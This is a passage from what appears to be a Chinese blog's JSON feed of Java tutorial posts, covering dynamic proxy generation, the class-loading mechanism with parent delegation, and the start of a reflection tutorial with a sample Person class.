   <span class=\"token class-name\">ProxyGenerator<span class=\"token punctuation\">.</span>MethodInfo</span> var21 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ProxyGenerator<span class=\"token punctuation\">.</span>MethodInfo</span><span class=\"token punctuation\">)</span>var15<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>                    var21<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>var14<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>                var14<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>                <span class=\"token keyword\">return</span> var13<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> var9<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InternalError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unexpected I/O Exception\"</span><span class=\"token punctuation\">,</span> var9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>字节码生成后，调用 defineClass0 来解析字节码，生成了 Proxy 的 Class 对象。在了解完代理类动态生成过程后，生产的代理类是怎样的，谁来执行这个代理类。</p>\n<p>其中，在 ProxyGenerator.generateProxyClass 函数中 saveGeneratedFiles 定义如下，其指代是否保存生成的代理类 class 文件，默认 false 不保存。<br />\n我们可以修改此系统变量</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">getProperties</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.misc.ProxyGenerator.saveGeneratedFiles\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"true\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>简单来说，动态代理就是实现了代理类的全部接口包括继承方法，并生成 class 文件，通过 class 对象生成 proxy 实例。<br />\n只要理解 Proxy.newProxyInstance 的参数类型，就能够很好的理解其中的原理，明白调用参数都有什么作用，在工作中就能够游刃有余。</p>\n",
            "tags": [
                "网络安全",
                "JAVA安全",
                "JAVA基础"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/20/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/",
            "url": "http://zhyzhyzhy.cn/2022/10/20/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/",
            "title": "Java 类加载机制",
            "date_published": "2022-10-19T16:00:00.000Z",
            "content_html": "<h1 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h1>\n<p>在开始正文之前，我们先看两张图 。Java 平台的理解？Java 最显著的特性？Java 是解释执行？ 先看一下 java 程序的执行流程图</p>\n<p><img data-src=\"https://s2.loli.net/2022/10/20/izSg2YZAtqnMNLw.png\" alt=\" Java程序运行流程.png\" /></p>\n<h1 id=\"类加载机制概念\"><a class=\"anchor\" href=\"#类加载机制概念\">#</a> 类加载机制概念</h1>\n<p>Java 虚拟机把描述类的数据从 Class 文件加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的 Java 类型，这就是虚拟机的加载机制。*<br />\nClass 文件由类装载器装载后，在 JVM 中将形成一份描述 Class 结构的元信息对象，通过该元信息对象可以获知 Class 的结构信息：如构造函数，属性和方法等，Java 允许用户借由这个 Class 相关的元信息对象间接调用 Class 对象的功能，这里就是我们经常能见到的 Class 类。</p>\n<p><img data-src=\"https://s2.loli.net/2022/10/20/izSg2YZAtqnMNLw.png\" alt=\" Java程序运行流程.png\" /></p>\n<h1 id=\"类加载过程\"><a class=\"anchor\" href=\"#类加载过程\">#</a> 类加载过程</h1>\n<p>类装载器就是寻找类的字节码文件，并构造出类在 JVM 内部表示的对象组件。在 Java 中，类装载器把一个类装入 JVM 中，要经过以下步骤：</p>\n<p>(1) 装载：查找和导入 Class 文件；</p>\n<p>(2) 链接：把类的二进制数据合并到 JRE 中；</p>\n<pre><code> (a)校验：检查载入Class文件数据的正确性；\n\n (b)准备：给类的静态变量分配存储空间；\n\n (c)解析：将符号引用转成直接引用；\n</code></pre>\n<p>(3) 初始化：对类的静态变量，静态代码块执行初始化操作</p>\n<h2 id=\"1-装载加载\"><a class=\"anchor\" href=\"#1-装载加载\">#</a> 1. 装载 (加载)</h2>\n<ul>\n<li>类加载指的是将 class 文件读入内存，并为之创建一个 java.lang.Class 对象，即程序中使用任何类时，系统都会为之建立一个 java.lang.Class 对象，系统中所有的类都是 java.lang.Class 的实例。</li>\n<li>类的加载由类加载器完成，JVM 提供的类加载器叫做系统类加载器，此外还可以通过继承 ClassLoader 基类来自定义类加载器。</li>\n<li>通常可以用如下几种方式加载类的二进制数据：</li>\n</ul>\n<ol>\n<li>从本地文件系统加载 class 文件。</li>\n<li>从 JAR 包中加载 class 文件，如 JAR 包的数据库启驱动类。</li>\n<li>通过网络加载 class 文件。</li>\n<li>把一个 Java 源文件动态编译并执行加载。</li>\n</ol>\n<h2 id=\"2-连接\"><a class=\"anchor\" href=\"#2-连接\">#</a> 2. 连接</h2>\n<p>连接阶段负责把类的二进制数据合并到 JRE 中，其又可分为如下三个阶段：</p>\n<h3 id=\"1-验证\"><a class=\"anchor\" href=\"#1-验证\">#</a> 1. 验证</h3>\n<p>确保加载的类信息符合 JVM 规范，无安全方面的问题。</p>\n<h3 id=\"2-准备\"><a class=\"anchor\" href=\"#2-准备\">#</a> 2. 准备</h3>\n<p>为类的静态 Field 分配内存，并设置初始值。</p>\n<h3 id=\"3-解析\"><a class=\"anchor\" href=\"#3-解析\">#</a> 3. 解析</h3>\n<p>将类的二进制数据中的符号引用替换成直接引用。</p>\n<h2 id=\"3-初始化\"><a class=\"anchor\" href=\"#3-初始化\">#</a> 3. 初始化</h2>\n<p>该阶段主要是对静态 Field 进行初始化，在 Java 类中对静态 Field 指定初始值有两种方式：</p>\n<ol>\n<li>声明时即指定初始值，如 static int a = 5；</li>\n<li b=\"\">使用静态代码块为静态 Field 指定初始值，如：static</li>\n</ol>\n<p>&lt;/br&gt;</p>\n<h1 id=\"类加载机制\"><a class=\"anchor\" href=\"#类加载机制\">#</a> 类加载机制</h1>\n<p>jvm 对 class 文件采用的是按需加载的方式，当需要使用该类时，jvm 才会将它的 class 文件加载到内存中产生 class 对象。<br />\n<img data-src=\"https://s2.loli.net/2022/10/20/bIecqtH4SaQFJKn.png\" alt=\"双亲委派.png\" /><br />\n 在加载类的时候，是采用的双亲委派机制，即把请求交给父类处理的一种任务委派模式。</p>\n<h2 id=\"bootstrap-classloader\"><a class=\"anchor\" href=\"#bootstrap-classloader\">#</a> Bootstrap ClassLoader</h2>\n<blockquote>\n<p>无父类加载器，嵌套在 JVM 内部，java 程序无法直接操作这个类，使用 C/C++ 语言实现。<br />\n用于加载 Java 核心类库，如 &lt;JAVA_HOME&gt;/lib 目录下的类库，出于安全考虑，启动类只加载包名为：java、javax、sun 开头的类。</p>\n</blockquote>\n<h2 id=\"extension-classloader\"><a class=\"anchor\" href=\"#extension-classloader\">#</a> Extension ClassLoader</h2>\n<blockquote>\n<p>扩展类加载器 (Extention Classloader) 父类加载器为 Bootstrap ClassLoader, 由 Java 语言编写。<br />\n扩展类加载器 (Extention Classloader) 负责加载 JVM 扩展类，比如从系统属性 java.ext.dirs 目录中加载类库，或者从 JDK 安装目录 $JAVA_HOME/jre/lib/ext 目录下加载类库。我们就可以将我们自己的包放在以上目录下，就会自动加载进来了。</p>\n</blockquote>\n<h2 id=\"application-classloader\"><a class=\"anchor\" href=\"#application-classloader\">#</a> Application ClassLoader</h2>\n<blockquote>\n<p>应用程序加载器 (Application Classloader) 也叫系统类加载器，负责加载环境变量 classpath 或者系统属性 java.class.path 指定路径下的类库。<br />\n它同时也是程序中默认的类加载器，我们 Java 程序中的类，都是由它加载完成的。</p>\n</blockquote>\n<h2 id=\"custom-classloader\"><a class=\"anchor\" href=\"#custom-classloader\">#</a> Custom ClassLoader</h2>\n<blockquote>\n<p>我们可以自定义类加载器，满足特殊的类加载需求，如解决类冲突，实现热加载，实现 jar 包的加密保护。主要由两种实现方式：</p>\n<p>继承 java.lang.ClassLoader，重写 findClass () 方法<br />\n继承 URLClassLoader 类，重写 loadClass 方法</p>\n</blockquote>\n<ul>\n<li>工作原理</li>\n</ul>\n<pre><code>（1）如果一个类加载器接收到了类加载的请求，它自己不会先去加载，会把这个请求委托给父类加载器去执行。\n\n（2）如果父类还存在父类加载器，则继续向上委托，一直委托到启动类加载器：Bootstrap ClassLoader\n\n（3）如果父类加载器可以完成加载任务，就返回成功结果，如果父类加载失败，就由子类自己去尝试加载，如果子类加载失败就会抛出ClassNotFoundException异常，这就是双亲委派模式\n</code></pre>\n",
            "tags": [
                "网络安全",
                "JAVA安全",
                "JAVA基础"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/19/Java%E5%8F%8D%E5%B0%84/",
            "url": "http://zhyzhyzhy.cn/2022/10/19/Java%E5%8F%8D%E5%B0%84/",
            "title": "Java 反射",
            "date_published": "2022-10-18T16:00:00.000Z",
            "content_html": "<h1 id=\"反射的概述\"><a class=\"anchor\" href=\"#反射的概述\">#</a> 反射的概述</h1>\n<blockquote>\n<p>反射非常强大和有用，现在市面上绝大部分框架 (spring、mybatis、rocketmq 等等) 中都有反射的影子，反射机制在框架设计中占有举足轻重的作用。</p>\n</blockquote>\n<p>学习之前的几个问题</p>\n<ul>\n<li>反射是什么？</li>\n<li>反射有什么用？</li>\n<li>反射的实现原理？</li>\n<li>怎么用反射？</li>\n</ul>\n<h1 id=\"反射是什么\"><a class=\"anchor\" href=\"#反射是什么\">#</a> 反射是什么？</h1>\n<p>反射是 java 语言的一个特性，它允程序在运行时（注意不是编译的时候）来进行自我检查并且对内部的成员进行操作。</p>\n<p>反射是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意方法和属性，这种动态获取信息以及动态调用对象方法的功能称为 java 语言的反射机制。</p>\n<p>一句话总结：<em><strong>反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法.</strong></em></p>\n<h1 id=\"为什么要用反射\"><a class=\"anchor\" href=\"#为什么要用反射\">#</a> 为什么要用反射？</h1>\n<p>Java Reflection 功能非常强大，并且非常有用，比如：</p>\n<ul>\n<li>获取任意类的名称、package 信息、所有属性、方法、注解、类型、类加载器等</li>\n<li><em><strong>获取任意对象的属性，并且能改变对象的属性</strong></em></li>\n<li><em><strong>调用任意对象的方法</strong></em></li>\n<li>判断任意一个对象所属的类</li>\n<li><em><strong>实例化任意一个类的对象</strong></em></li>\n<li>通过反射我们可以实现动态装配，降低代码的耦合度，动态代理等。</li>\n</ul>\n<h1 id=\"怎么使用反射\"><a class=\"anchor\" href=\"#怎么使用反射\">#</a> 怎么使用反射？</h1>\n<h2 id=\"获取class对象-调用对象方法\"><a class=\"anchor\" href=\"#获取class对象-调用对象方法\">#</a> 获取 Class 对象 -&gt; 调用对象方法</h2>\n<p>Class 对象是反射的核心，通过 Class 对象可以调用任意类的方法</p>\n<h2 id=\"获取class对象的方法\"><a class=\"anchor\" href=\"#获取class对象的方法\">#</a> 获取 Class 对象的方法</h2>\n<h3 id=\"一-调用某个类的getclass方法\"><a class=\"anchor\" href=\"#一-调用某个类的getclass方法\">#</a> 一、 调用某个类的 getClass 方法</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Person</span> person <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Class</span> aClass <span class=\"token operator\">=</span> person<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"二-调用某个类的class属性获取该类的class对象\"><a class=\"anchor\" href=\"#二-调用某个类的class属性获取该类的class对象\">#</a> 二、 调用某个类的 class 属性获取该类的 Class 对象</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span> aClass <span class=\"token operator\">=</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"三-使用class类中的forname方法最常用\"><a class=\"anchor\" href=\"#三-使用class类中的forname方法最常用\">#</a> 三、 使用 Class 类中的 forName () 方法（最常用）</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span> aClass <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"类的全路径名\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"创建对象的方法\"><a class=\"anchor\" href=\"#创建对象的方法\">#</a> 创建对象的方法</h2>\n<h3 id=\"一-调用class对象的newinstance\"><a class=\"anchor\" href=\"#一-调用class对象的newinstance\">#</a> 一 、 调用 Class 对象的 newInstance ()</h3>\n<blockquote>\n<p>要求该 Class 对象对应的类必须由空参构造器</p>\n</blockquote>\n<h3 id=\"二-调用constructor对象的new-instance\"><a class=\"anchor\" href=\"#二-调用constructor对象的new-instance\">#</a> 二、 调用 Constructor 对象的 new Instance ()</h3>\n<blockquote>\n<p>通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 对象则只能使用默认的无参数构造方法。</p>\n</blockquote>\n<h2 id=\"反射对对象的属性和方法进行操作\"><a class=\"anchor\" href=\"#反射对对象的属性和方法进行操作\">#</a> 反射对对象的属性和方法进行操作</h2>\n<h3 id=\"1-获取类的成员变量的信息\"><a class=\"anchor\" href=\"#1-获取类的成员变量的信息\">#</a> 1、获取类的成员变量的信息</h3>\n<pre><code>getField(String name)  获取某个共有的属性对象  \ngetFields()  获取所有公有的属性对象  \ngetDeclaredField(String name)  获取某个属性对象（public和非public）  \ngetDeclaredFields()  获取所有属性对象（public和非public）  \n</code></pre>\n<h3 id=\"2-获得类方法\"><a class=\"anchor\" href=\"#2-获得类方法\">#</a> 2、获得类方法</h3>\n<pre><code>getMethod(String name,Class...&lt;?&gt; parameterTypes)  获取某个公有的方法  \ngetMethods()  获取所有公有的方法  \ngetDeclaredMethod(String name,Class...&lt;?&gt; parameterTypes)  获取该类某个方法（public和非public）  \ngetDeclaredMethods()  获取该类所有方法（public和非public） \n</code></pre>\n<h3 id=\"3-获得构造函数\"><a class=\"anchor\" href=\"#3-获得构造函数\">#</a> 3、获得构造函数</h3>\n<pre><code>getConstructor(Class...&lt;?&gt; parameterTypes)  获得该类中与参数类型匹配的公有构造方法\ngetConstructor()  获得该类中所有公有构造方法\ngetDeclaredConstructor(Class...&lt;?&gt; parameterTypes)  获得该类中与参数类型匹配的构造方法\ngetDeclaredConstructors()  获得该类中所有构造方法\n</code></pre>\n<h1 id=\"一个小案例\"><a class=\"anchor\" href=\"#一个小案例\">#</a> 一个小案例</h1>\n<blockquote>\n<p>下面写个小案例来了解如何在实际工作中进行使用</p>\n</blockquote>\n<p>Person 类</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> money<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> money<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>money <span class=\"token operator\">=</span> money<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> age<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> money<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>money <span class=\"token operator\">=</span> money<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> o<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span> <span class=\"token operator\">==</span> o<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>o <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">||</span> <span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> o<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token class-name\">Person</span> person <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Person</span><span class=\"token punctuation\">)</span> o<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">return</span> age <span class=\"token operator\">==</span> person<span class=\"token punctuation\">.</span>age <span class=\"token operator\">&amp;&amp;</span> money <span class=\"token operator\">==</span> person<span class=\"token punctuation\">.</span>money <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name\">Objects</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> person<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token class-name\">Objects</span><span class=\"token punctuation\">.</span><span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">,</span> money<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Person&#123;\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                <span class=\"token string\">\"name='\"</span> <span class=\"token operator\">+</span> name <span class=\"token operator\">+</span> <span class=\"token char\">'\\''</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                <span class=\"token string\">\", age=\"</span> <span class=\"token operator\">+</span> age <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                <span class=\"token string\">\", money=\"</span> <span class=\"token operator\">+</span> money <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                <span class=\"token char\">'&#125;'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">return</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getAge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">return</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setAge</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getMoney</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token keyword\">return</span> money<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setMoney</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> money<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>money <span class=\"token operator\">=</span> money<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>测试类</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> test <span class=\"token 